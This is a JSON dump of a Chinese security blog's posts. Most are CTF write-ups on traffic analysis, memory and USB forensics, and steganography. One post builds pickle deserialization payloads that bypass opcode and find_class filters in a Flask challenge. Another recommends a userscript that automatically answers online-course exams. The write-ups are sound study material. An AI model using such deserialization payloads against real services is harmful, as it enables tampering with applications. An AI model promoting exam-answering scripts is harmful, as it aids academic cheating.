服务器响应HTTP请求HTTP响应包括了状态行、响应头、响应正文。状态行标识了http协议版本与状态码。响应头包含了一些字段。比如set-cookie,date,allow,content-encoding等字段。以K:V形式出现。 浏览器显示html页面1.加载解析HTML，开始构建DOM树。2.遇到CSS外链，异步加载解析CSS，构建CSS规则树。3.遇到script标签，如果是普通JS标签则同步加载并执行，阻塞页面渲染，如果标签上有defer/async属性则异步加载JS资源。设置defer的JS资源会在DOMContentLoaded事件之前执行；设置了async的JS资源加载完就执行。4.合并DOM树和CSS规则树生成render树。5.布局render树，计算各元素的尺寸、位置等，在内存上生成Bitmap。6.渲染render树，将内存上的Bitmap绘制到屏幕上。 页面加载完成","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"buu登录流量分析","slug":"buu登录流量分析","date":"2020-03-14T14:21:56.000Z","updated":"2020-03-14T14:25:19.703Z","comments":true,"path":"2020/03/14/buu登录流量分析/","link":"","permalink":"https://polosec.github.io/2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"预备知识：wireshark基本操作题目分析：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交打开数据包首先考虑登录页面，往下稍微翻了一下就看到了一个意思登录页面（编号20） 是向user.php提交数据，盲猜登陆界面。然后追踪流-TCP流，即可看到密码。 这应该是第一道秒的题 太菜了。","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"python pickle反序列化初步学习","slug":"python-pickle反序列化初步学习","date":"2020-03-12T10:41:38.000Z","updated":"2020-03-12T12:16:59.445Z","comments":true,"path":"2020/03/12/python-pickle反序列化初步学习/","link":"","permalink":"https://polosec.github.io/2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"预备知识：python、pickle、stack、面向对象基础致敬：从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势注意：此篇文章需先通读文章链接中的一些基础概念，否则理解起来可能存在困难，在对例题进行讲解的过程中不会过多阐述基础概念。 BB几句其实之前没怎么接触过python pickle模块的反序列化，或者说没接触过反序列化，这次”高校抗疫”CTF线上赛给我上了一课。有一道webtmp的题目，是与python pickle模块的反序列化有关，我也找到了非常详细的解析(致敬部分已贴出)，但是没有沉下心认真地去一步步地做，所以这道题也没有做出来，其实这道题不难，做出来的师傅还是很多的。相反，内存取证的一道题我根据教程一步步做出来了，也可能是之前web没做出来过题导致了这个结果。还需努力！ 相关概念建议通读 致敬文章。需要明确的概念：数据结构–栈。python数据类型：list、tuple、dict Python中list（列表）、dict（字典）、tuple（元组）、set（集合）详细介绍pickle、pickletools ：详见致敬部分链接。 题目分析第一题：题目链接：HITCTF题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import base64import picklefrom flask import Flask, Response, render_template, requestimport pickletools,sysapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categorydef read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__), mimetype=&#x27;text/plain&#x27;) if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;No... I don\\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27; else: result = pickle.loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return &#x27;Are you sure that is an animal???&#x27; correct = (result == Animal(favorite.name, favorite.category)) return render_template(&#x27;unpickle_result.html&#x27;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: return &#x27;something wrong...&#x27; sample_obj = Animal(&#x27;kitty&#x27;, &#x27;cat&#x27;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(&#x27;unpickle_page.html&#x27;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 题目的要求是,传入一个经过base64加密的pickle序列化后的字符串，在服务器端对该字符串进行解析，如果不包含R指令码并且解析后的对象类型为Animal，并且与其规定的favorite对象的name与category属性都一样的话，则可获得flag。对代码进行审计，观察第34行，过滤了R指令码，即堵上了RCE这条路。继续分析，发现并没有重写find_class方法，即可以通过引入favorite.name 和favorite.category的方法通过判定。即： 123o1=Animal()o1.name=favorite.nameo1.category=favorite.category 这样构造的对象可以保证通过**correct = (result == Animal(favorite.name, favorite.category))**这句代码的判定。接下来的问题是构造这种对象。通过对指令码的学习，我们可以构造出这种对象。首先构造正常的animal对象。 1234567891011121314151617181920212223242526import pickle,pickletoolso1=Animal(&#x27;xx&#x27;,&#x27;yy&#x27;)normal=pickle.dumps(o1)#这是正常animal经序列化后的数据,ser=b&#x27;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x02\\x00\\x00\\x00xxq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x02\\x00\\x00\\x00yyq\\x06ub.&#x27;#这是序列化之后的数据（字符串形式）其实就是normal，我把它打印出来了。pickletools.dis(normal)#下面为pickletools.dis(normal)的结果0: \\x80 PROTO 3 2: c GLOBAL &#x27;__main__ Animal&#x27; 19: q BINPUT 0 21: ) EMPTY_TUPLE 22: \\x81 NEWOBJ 23: q BINPUT 1 25: &#125; EMPTY_DICT 26: q BINPUT 2 28: ( MARK 29: X BINUNICODE &#x27;name&#x27; 38: q BINPUT 3 40: X BINUNICODE &#x27;xx&#x27; 47: q BINPUT 4 49: X BINUNICODE &#x27;category&#x27; 62: q BINPUT 5 64: X BINUNICODE &#x27;yy&#x27; 71: q BINPUT 6 73: u SETITEMS (MARK at 28) 74: b BUILD 75: . STOP 根据思路，只需要把40 64标号处的值替换为favorite.name、favorite.category即可。方法：使用c(global)指令引入我们所需的数据。即把’xx’ 通过c指令换成favorite.name，’yy’换成favorite.category实现：把ser中xx与yy的编码使用golbal favorite.xx替换。 1payload=b&#x27;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03cfavorite\\nname\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05cfavorite\\ncategory\\nq\\x06ub.&#x27; Then,encode it! 1print(base64.b64encode(payload)) 最终结果:gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu 第二题题目链接：HITCTF题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport favoriteapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__), mimetype=&#x27;text/plain&#x27;) if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;No... I don\\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return &#x27;Are you sure that is an animal???&#x27; correct = (result == Animal(favorite.name, favorite.category)) return render_template(&#x27;unpickle_result.html&#x27;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return &quot;Something wrong&quot; sample_obj = Animal(&#x27;kitty&#x27;, &#x27;cat&#x27;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(&#x27;unpickle_page.html&#x27;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 题目分析：相比上一个题，该题多了一个find_class方法的重写。规定了module只能是main中的，所以就无法引入favorite了。解题思路：通过__main__.blue引入这一个module，由于命名空间还在main内，故不会被拦截。然后修改当前引入对象的属性，自定义即可。然后把这个对象弹出，再压入一个正常的animal对象。注意：该正常对象的属性值须与你刚才设定的属性值相同。payload=b’\\x80\\x03c__main__\\nfavorite\\n}(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyub0c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyub.’经过base64加密后提交即可。 总结这类问题只能说初步了解，具体还有很多细节没有弄明白。还需要进一步学习。最后一道题的payload在写完favorite\\n后压入一个空dict后，把当前栈这个整体，作为一个list，压进前序栈（opcode: (（ 也就是MARK操作符））。之后的操作就是更新favorite.name 和favorite.category分别为xx 和yy。对应X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yy。然后u就是形成键值对，b-build，把当前键值对的值给前序栈中的对象。这样前半部分的操作就完成了。对该对象修改完之后直接弹出(opcode : 0)，不管他了，然后再插一个正经对象，属性值一样就OK。","categories":[{"name":"web基础","slug":"web基础","permalink":"https://polosec.github.io/categories/web%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"三条命令","slug":"三条命令","date":"2020-03-09T13:53:48.000Z","updated":"2020-03-09T14:15:19.130Z","comments":true,"path":"2020/03/09/三条命令/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/","excerpt":"","text":"预备知识 wireshark、SYN、TCP、HTTP参考、致敬:WireShark教程 – 黑客发现之旅(5) – (nmap)扫描探测 文件分析那到手的文件啥也不是，文件名zip，考虑压缩文件。解压后得到一数据包，用wireshark打开 数据包分析常规追踪了一下TCP流、HTTP流、导出对象，并没有什么收获。接下来分析题目，说是扫描端口，结合HTTP导出对象中的nmap字样，猜测是NMAP扫描。结合参考中的链接，可以推测扫描方式为全连接扫描。通过对特征字段的分析，发现端口存在的数据包返回的TSecr字段的值不为0，则可以根据此找出开放的端口。按ctrl+f弹出上方搜索框，选择字符串，搜索TSecr=4799。 题目总结这道题其实不太难，懂得扫描方式可以把这题秒了，但是我8太懂，还是现百度的。事实证明考高分没用，重要的是实践！","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"usb&内存取证","slug":"usb-内存取证","date":"2020-03-09T12:46:06.000Z","updated":"2020-03-28T09:13:38.667Z","comments":true,"path":"2020/03/09/usb-内存取证/","link":"","permalink":"https://polosec.github.io/2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/","excerpt":"","text":"预备知识：wireshark流量分析、binwalk、内存取证、USB、volatility 、strings、grep参考、致敬：CTF 内存取证 USB流量分析 附件分析拿到附件后，只有一个数据包文件。不用想，直接用wireshark打开分析一波。##文件分析这玩意确实挺大的，首先考虑包含了文件，使用kali linux 下的工具binwalk分析一波。但是binwalk出来的附件在解压时都损坏了，此路不通。继续分析我们的流量包，追踪http协议。发现了巨大的包，可能有附件，于是在wireshark中导出http对象。（左上角文件-导出对象-http）接下来观察导出的文件有两个一样的较大的php文件，考虑文件包含。再次丢到binwalk里面分析一波。果不其然，分离出了data.vmem文件。可以理解为vmem文件保存了当时内存中的数据，以支持在虚拟机中的暂停功能。接下来用内存分析工具volatility 分析data.vmem使用方法： volatility -f filename imageinfo //查看镜像信息。通过imageinfo 可以确定，镜像为WinXPSP2x86或者WinXPSP3x86.（影响不大）接下来使用命令 volatility -f data.vmem –profile=WinXPSP2x86 filescan 扫描内存中的文件可以看到有一堆文件。由于是ctf比赛，尝试过滤文件：比赛名称xctf或者flag 即volatility -f data.vmem –profile=WinXPSP2x86 filescan |grep flagvolatility -f data.vmem –profile=WinXPSP2x86 filescan |grep xctf]通过过滤flag 我们找到了flag.img文件。 DUMP IT!接下来需要做的事将flag.img 导出。使用命令 volatility -f data.vmem –profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -D ./将文件导出至当前目录。导出文件为二进制格式。接下来继续binwalk分析。可以得到一个压缩包，压缩包里包含了加密的usb.txt文件。下一步就是获取加密的密码。在尝试爆破的同时，继续进行内存取证分析。通过volatility工具的子命令 hivelist 可以获得内存中的注册表信息，cmdscan查看cmd操作，connscan查看网络连接，pslist查看进程。通过cmscan我们可以发现提示了密码：尝试将该密码作为文件的解压密码（使用360解压，可以自动修复文件）—-成功！现在获得了敲击码，接下来就是将敲击码转换为字符。使用脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import sysimport os usb_codes = &#123; 0x04:&quot;aA&quot;, 0x05:&quot;bB&quot;, 0x06:&quot;cC&quot;, 0x07:&quot;dD&quot;, 0x08:&quot;eE&quot;, 0x09:&quot;fF&quot;, 0x0A:&quot;gG&quot;, 0x0B:&quot;hH&quot;, 0x0C:&quot;iI&quot;, 0x0D:&quot;jJ&quot;, 0x0E:&quot;kK&quot;, 0x0F:&quot;lL&quot;, 0x10:&quot;mM&quot;, 0x11:&quot;nN&quot;, 0x12:&quot;oO&quot;, 0x13:&quot;pP&quot;, 0x14:&quot;qQ&quot;, 0x15:&quot;rR&quot;, 0x16:&quot;sS&quot;, 0x17:&quot;tT&quot;, 0x18:&quot;uU&quot;, 0x19:&quot;vV&quot;, 0x1A:&quot;wW&quot;, 0x1B:&quot;xX&quot;, 0x1C:&quot;yY&quot;, 0x1D:&quot;zZ&quot;, 0x1E:&quot;1!&quot;, 0x1F:&quot;2@&quot;, 0x20:&quot;3#&quot;, 0x21:&quot;4$&quot;, 0x22:&quot;5%&quot;, 0x23:&quot;6^&quot;, 0x24:&quot;7&amp;&quot;, 0x25:&quot;8*&quot;, 0x26:&quot;9(&quot;, 0x27:&quot;0)&quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-_&quot;, 0x2E:&quot;=+&quot;, 0x2F:&quot;[&#123;&quot;, 0x30:&quot;]&#125;&quot;, 0x32:&quot;#~&quot;, 0x33:&quot;;:&quot;, 0x34:&quot;&#x27;\\&quot;&quot;, 0x36:&quot;,&lt;&quot;, 0x37:&quot;.&gt;&quot;, 0x4f:&quot;&gt;&quot;, 0x50:&quot;&lt;&quot; &#125; def code2chr(filepath): lines = [] pos = 0 for x in open(filepath,&quot;r&quot;).readlines(): code = int(x[6:8],16) # 即第三个字节 if code == 0: continue # newline or down arrow - move down if code == 0x51 or code == 0x28: pos += 1 continue # up arrow - move up if code == 0x52: pos -= 1 continue # select the character based on the Shift key while len(lines) &lt;= pos: lines.append(&quot;&quot;) if code in range(4,81): if int(x[0:2],16) == 2: lines[pos] += usb_codes[code][1] else: lines[pos] += usb_codes[code][0] for x in lines: print(x) if __name__ == &quot;__main__&quot;: # check argv if len(sys.argv) != 2: print(&quot;Usage:\\n\\tpython keyboardScanCode.py datafile.txt\\nhow to get datafile:\\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;) exit(1) else: filepath = sys.argv[1] code2chr(filepath) 读取usbdata.txt即可获取flag.注意将括号[]转为{} 题目总结","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"简单misc","slug":"简单misc","date":"2020-03-09T12:26:32.000Z","updated":"2020-03-09T14:18:49.198Z","comments":true,"path":"2020/03/09/简单misc/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E7%AE%80%E5%8D%95misc/","excerpt":"","text":"预备知识 :kali linux、binwalk使用、文件头文件尾、base64、摩斯密码附件分析：我们拿到一个压缩包，包括了一张图片和一个压缩包。子压缩包中有flag，但是被加密了。 图片处理将图片解压后，我们可以看到图片是裂的，不能看。所以考虑将图片修复。常见文件头尾使用winhex打开后，发现文件头尾正确。但是文件尾部并不是以FF D9结尾。所以我们考虑可能有额外的文件包含在了这张图片中。 文件分离使用binwalk 工具，可以分析文件结构，将复合文件提取出来。使用方法：binwalk -e filename eg:binwalk -e photo.jpg分析完后可以发现文本ctf.txt 打开后发现是摩斯密码，使用工具将其解密后为EPIDEMICSITUATIONOFUNIVERSITYWAR由于不是常见的密码形式，于是尝试base64解码。解码后得到EPIDEMICSITUATIONOFUNIVERSITYWAR然后解压附件中的加密文件。解压后，附件flag.txt中的文件内容为VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=看到**=**，考虑base64编码。进行解码。base64解码工具解码后的内容为Th1s_is_FlaG_you_aRE_rigHT即可获得正确flag。 题目总结这道题相对比较简单 虽然师傅们秒了，我还是花了几分钟才做出来。也可能是运气成分，加上这题比较简单，所以思路比较清晰。这题的关键是文件分离与看得懂编码。base系列编码介绍","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"隐藏的信息","slug":"隐藏的信息","date":"2020-03-09T11:31:54.000Z","updated":"2020-03-09T14:17:43.483Z","comments":true,"path":"2020/03/09/隐藏的信息/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/","excerpt":"","text":"预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原附件分析1.拿到这道题的文件后，首先看到一张二维码，还有一个有解压密码的压缩包。2.首先对这张二维码进行分析。放入WINHEX(16进制分析工具)后可以发现，在文件的最后隐约有提示”use base64 to get your flag”。暂时不知道什么用，记下来。3.由于二维码是残缺的，通过PS对二维码的三个定位点复原后可以获得原二维码，然而没有有用的信息。这里不作详细解释。4.接下来我们着手分析这个加密的压缩包。 加密压缩包处理由于压缩包是加密的，首先考虑暴力破解、CRC32碰撞等方式破解密码—-无效。接下来考虑到压缩包可能是伪加密(关于伪加密的详细概念见预备知识中的链接)简单来说就是实际上压缩包是没有加密的，只是出现了表面上加密，让你输入解压密码。破解伪加密的方法：使用winhex软件打开压缩包，将504B0304后的第3、4个字节改为00 00，将504B0102后的第5、6个字节改为00 00即可破解伪加密。 之后再解压文件就不会提示输入解压密码了。 音频文件分析使用音频分析软件Audacity打开wav文件进行分析。点击软件左方倒三角，模式切换到波形(db)即可发现音频文件的前后都有听不到、但是有分贝的部分。然后把中间的能听到的部分切掉，将剩下的听不到的部分导出，然后打开AU。打开AU后导入文件，看到音轨是平的，于是我们增加分贝。统一增加分贝后，由于前面一段的声音太小，于是对前面一段单独增加分贝。这样就可以听清了。然后打开手机拨号键盘，根据拨号音以及之间的细微差别，可以听出播的号码为187485618521。根据开头图片给的提示，通过base64加密后，即可获得flag. 题目总结这道题整体来说不难。但是在音频处理的时候很多人想不到拨号音以及放大。在听拨号音的时候其实可以用一些工具，但是对音频分贝的处理以及噪声可能会导致工具识别错误。所以采用用耳朵听的方式。在听的时候先听前五个，自己去拨号模拟一下。前五个比较好确定。然后听最后三个 只有4种特定的键位才能形成最后三个的音调。然后两两确定中间的67 89，多次尝试后即可获得正确的结果。","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"如何科学地看网课(知到)","slug":"科学看网课","date":"2020-03-06T10:08:41.000Z","updated":"2020-03-13T09:26:06.402Z","comments":true,"path":"2020/03/06/科学看网课/","link":"","permalink":"https://polosec.github.io/2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/","excerpt":"","text":"使用谷歌浏览器安装油猴插件从 油猴下载链接 获取油猴脚本的插件(需要科学上网)。下载后根据提示，将油猴插件添加至chrome扩展。添加过后就可以在地址栏右侧看到这个图标：代表安装成功。无需科学上网的方法：从墙内链接获取油猴脚本.CRX文件，然后在浏览器地址栏输入chrome://extensions 添加.crx文件。详细添加教程转自Chrome安装CRX插件方法 获取看网课脚本随后单击该图标，选择获取新脚本。点击第二个”GreasyFork”。进入后搜索”智慧树网课助手”单击进入后，选择安装。安装后是这样：随后打开网课系统，登陆后点开需要看的网课可自动1.5倍速静音播放。 自动考试该脚本最好的功能(个人认为)是自动考试功能。使用方法：选择章节作业/考试，点进去后脚本会自动搜索题目答案并且自动选择，等所有答案检索完毕后提交即可。 吐槽智慧树平台个人感觉一般。1.登陆时界面不够人性化，而且选择学号登陆时，选择学校，输入完学号密码后按回车登录会跳转到手机号登录。再次选择学号登录才能正常登录。2.成绩分析界面 看课习惯时间轴逆序。做这个图的程序员起夜级李姐 :)。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"https://polosec.github.io/tags/%E6%9D%82%E9%A1%B9/"}]}],"categories":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/categories/git/"},{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"},{"name":"web基础","slug":"web基础","permalink":"https://polosec.github.io/categories/web%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"取证","slug":"取证","permalink":"https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"反序列化","slug":"反序列化","permalink":"https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://polosec.github.io/tags/ctf/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"},{"name":"流量分析","slug":"流量分析","permalink":"https://polosec.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"网络","slug":"网络","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"},{"name":"c++","slug":"c","permalink":"https://polosec.github.io/tags/c/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"密码学","slug":"密码学","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"c语言","slug":"c语言","permalink":"https://polosec.github.io/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"},{"name":"git","slug":"git","permalink":"https://polosec.github.io/tags/git/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"},{"name":"杂项","slug":"杂项","permalink":"https://polosec.github.io/tags/%E6%9D%82%E9%A1%B9/"}]}